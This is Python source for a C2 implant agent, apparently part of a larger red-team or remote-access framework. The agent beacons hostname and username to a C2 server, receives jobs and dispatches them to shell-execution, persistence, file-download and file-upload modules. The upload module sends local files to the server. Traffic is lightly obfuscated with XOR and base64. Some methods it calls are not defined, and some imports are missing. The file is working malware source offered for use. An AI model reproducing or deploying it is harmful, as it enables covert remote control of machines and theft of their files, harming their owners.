#!/usr/bin/env python3
import requests
import json
import time
import base64
import os
from base_agent import BaseAgent

class HTTPAgent(BaseAgent):
    def __init__(self, server_url, agent_id=None, sleep_interval=60):
        super().__init__()
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_agent_id()
        self.sleep_interval = sleep_interval
        self.session = requests.Session()
        
        # Simple XOR encryption key (replace with proper crypto in production)
        self.encryption_key = b'simplekey12345678'
    
    def generate_agent_id(self):
        """Generate unique agent ID"""
        import hashlib
        hostname = platform.node()
        username = getpass.getuser()
        unique_string = f"{hostname}_{username}_{os.urandom(8).hex()}"
        return hashlib.md5(unique_string.encode()).hexdigest()[:16]
    
    def encrypt_data(self, data):
        """Simple XOR encryption (replace with proper crypto)"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        key_len = len(self.encryption_key)
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.encryption_key[i % key_len])
        
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt XOR encrypted data"""
        encrypted_bytes = base64.b64decode(encrypted_data)
        decrypted = bytearray()
        key_len = len(self.encryption_key)
        
        for i, byte in enumerate(encrypted_bytes):
            decrypted.append(byte ^ self.encryption_key[i % key_len])
        
        return decrypted.decode()
    
    def beacon(self):
        """Send beacon to C2 server"""
        system_info = self.get_system_info()
        
        # Encrypt sensitive data
        encrypted_info = {
            'agent_id': self.agent_id,
            'system_info': system_info,
            'timestamp': time.time()
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/beacon",
                json=encrypted_info,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('jobs', [])
            else:
                print(f"[-] Beacon failed: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return []
    
    def send_result(self, job_id, output, success=True):
        """Send job result to C2 server"""
        result_data = {
            'agent_id': self.agent_id,
            'job_id': job_id,
            'output': output,
            'success': success,
            'timestamp': time.time()
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/result",
                json=result_data,
                timeout=30
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Error sending result: {e}")
            return False
    
    def upload_file(self, local_path, remote_filename=None):
        """Upload file to C2 server"""
        if not os.path.exists(local_path):
            return False
        
        remote_filename = remote_filename or os.path.basename(local_path)
        
        try:
            with open(local_path, 'rb') as f:
                files = {'file': (remote_filename, f)}
                data = {'agent_id': self.agent_id, 'filename': remote_filename}
                
                response = self.session.post(
                    f"{self.server_url}/upload",
                    files=files,
                    data=data,
                    timeout=60
                )
                
                return response.status_code == 200
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return False
    
    def download_file(self, remote_filename, local_path):
        """Download file from C2 server"""
        try:
            response = self.session.get(
                f"{self.server_url}/download/{remote_filename}",
                timeout=60
            )
            
            if response.status_code == 200:
                with open(local_path, 'wb') as f:
                    f.write(response.content)
                return True
            else:
                return False
                
        except Exception as e:
            print(f"[-] Download error: {e}")
            return False
    
    def run(self):
        """Main agent loop with HTTP communication"""
        print(f"[+] HTTP Agent started. ID: {self.agent_id}")
        print(f"[+] C2 Server: {self.server_url}")
        
        while True:
            try:
                # Beacon to server
                jobs = self.beacon()
                
                # Execute received jobs
                for job in jobs:
                    job_id = job.get('job_id')
                    module_name = job.get('module_name')
                    arguments = job.get('arguments', {})
                    
                    print(f"[+] Executing job {job_id}: {module_name}")
                    result = self.execute_module(module_name, arguments)
                    
                    # Send result back
                    self.send_result(job_id, result)
                
                # Sleep before next beacon
                time.sleep(self.sleep_interval)
                
            except KeyboardInterrupt:
                print("\n[!] Agent stopped by user")
                break
            except Exception as e:
                print(f"[-] Agent error: {e}")
                time.sleep(self.sleep_interval)
    
    def execute_module(self, module_name, arguments):
        """Execute module based on name"""
        if module_name == 'shell':
            return self.execute_shell_command(arguments)
        elif module_name == 'download':
            return self.handle_download(arguments)
        elif module_name == 'upload':
            return self.handle_upload(arguments)
        elif module_name == 'persistence':
            return self.establish_persistence(arguments)
        elif module_name == 'info':
            return self.get_detailed_info()
        else:
            return f"Unknown module: {module_name}"
    
    def handle_download(self, arguments):
        """Handle file download from C2"""
        remote_file = arguments.get('remote_file')
        local_path = arguments.get('local_path', remote_file)
        
        if self.download_file(remote_file, local_path):
            return f"Downloaded {remote_file} to {local_path}"
        else:
            return f"Failed to download {remote_file}"
    
    def handle_upload(self, arguments):
        """Handle file upload to C2"""
        local_file = arguments.get('local_file')
        remote_name = arguments.get('remote_name', os.path.basename(local_file))
        
        if self.upload_file(local_file, remote_name):
            return f"Uploaded {local_file} as {remote_name}"
        else:
            return f"Failed to upload {local_file}"